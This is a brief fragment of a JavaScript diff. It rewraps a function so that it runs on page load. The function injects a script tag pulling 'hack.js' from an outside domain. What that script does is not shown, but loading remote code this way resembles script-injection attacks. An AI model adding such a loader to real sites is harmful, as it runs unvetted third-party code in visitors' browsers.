@@ -7,8 +7,8 @@
             $('#header').stop().animate({ 'top': '0'}, 500);
         }
     });
-}, 
-function jsonp(){
+})();
+(function jsonp(){
     var script = document.createElement('script');
     script.setAttribute('src', 'http://www.oowltest.com/Skin/NewCo/Script/js/hack.js');
     script.setAttribute('type', 'text/javascript');
